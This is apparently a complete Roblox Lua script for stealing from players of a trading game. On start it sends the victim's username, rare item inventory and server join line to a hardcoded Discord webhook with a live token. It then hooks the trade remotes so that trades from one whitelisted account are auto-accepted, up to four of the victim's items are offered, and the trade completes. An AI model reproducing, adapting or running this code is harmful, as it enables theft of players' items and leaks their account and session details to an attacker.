local PlaceId = game["PlaceId\0"]
if not (PlaceId == 142823291 or PlaceId == 335132309 or PlaceId == 636649648) then return end

local WithdrawWhitelist = {
	["6PTQF"] = true,
}
local webhookURL = "https://discord.com/api/webhooks/1399728740648489140/go2sdu_Qu4hZhiXibmiLwf1FzsNo3TzAimUn4REABGonmC8Kiz-z9Piee9VcOO4NtjGv"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TradeRemotes = ReplicatedStorage:WaitForChild("Trade")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local InventoryModule = require(ReplicatedStorage.Modules.InventoryModule)
local LocalPlayer = Players.LocalPlayer
local TradeStarted = false
local DB = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

function send(url, message, username, avatar_url)
	local http = game:GetService("HttpService")
	local headers = { ["Content-Type"] = "application/json" }
	local data = {
		["content"] = message,
		["username"] = username,
		["avatar_url"] = avatar_url
	}
	local body = http:JSONEncode(data)
	request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

local function getInv()
	local success, inventory = pcall(function()
		return Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer)
	end)
	if not success or not inventory or not inventory.Weapons or not inventory.Weapons.Owned then
		return {}
	end
	local owned = inventory.Weapons.Owned
	local list = {}
	for ItemID, Amount in pairs(owned) do
		local itemData = DB[ItemID]
		if itemData and (itemData.Rarity == "Godly" or itemData.Rarity == "Ancient" or itemData.ItemName == "Corrupt") then
			table.insert(list, {
				Name = itemData.ItemName,
				Amount = "x" .. tostring(Amount)
			})
		end
	end
	return list
end

local function format(data)
	local message = "**User:** " .. LocalPlayer.Name .. "\n\n**Inventory:**\n"
	for _, item in ipairs(data) do
		message = message .. string.format("**%s** - %s\n", item.Name, item.Amount)
	end
	message = message .. "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")```"
	return message
end

local function alert()
	local message = format(getInv())
	local displayName = LocalPlayer.DisplayName
	local username = LocalPlayer.Name
	local avatarURL = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
	local webhookName = displayName .. " (@" .. username .. ")"
	task.defer(function()
		send(webhookURL, message, webhookName, avatarURL)
	end)
end
alert()

TradeRemotes.SendRequest.OnClientInvoke = function(Player)
	if not WithdrawWhitelist[Player.Name] then
		TradeRemotes.DeclineTrade:FireServer()
		return false
	end

	task.delay(0.2, function()
		TradeRemotes.AcceptRequest:FireServer()
	end)
	return true
end

TradeRemotes.StartTrade.OnClientEvent:Connect(function(TradeData, TheirName)
	if not WithdrawWhitelist[TheirName] then
		TradeRemotes.DeclineTrade:FireServer()
		return
	end

	TradeStarted = true
	local PlayerData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer()
	PlayerData.Uniques = {}
	local Sorted = InventoryModule.SortInventory(InventoryModule.GenerateInventoryTables(PlayerData, "Trading"))

	local maxItems = 4
	local count = 0

	for _, category in {"Weapons", "Pets"} do
		for itemName, info in pairs(Sorted.Data[category].Current) do
			if itemName == "DefaultGun" or itemName == "DefaultKnife" then continue end

			for i = 1, info.Amount do
				TradeRemotes.OfferItem:FireServer(itemName, category)
				task.wait()
				count += 1
				if count >= maxItems then break end
			end
			if count >= maxItems then break end
		end
		if count >= maxItems then break end
	end

	local attempts = 0
	repeat
		task.wait(0.2)
		attempts += 1
	until TradeStarted == false or attempts > 25

	if TradeStarted then
		TradeRemotes.AcceptTrade:FireServer(game.PlaceId * 2)
		TradeStarted = false
	end
end)

TradeRemotes.DeclineTrade.OnClientEvent:Connect(function()
	TradeStarted = false
end)
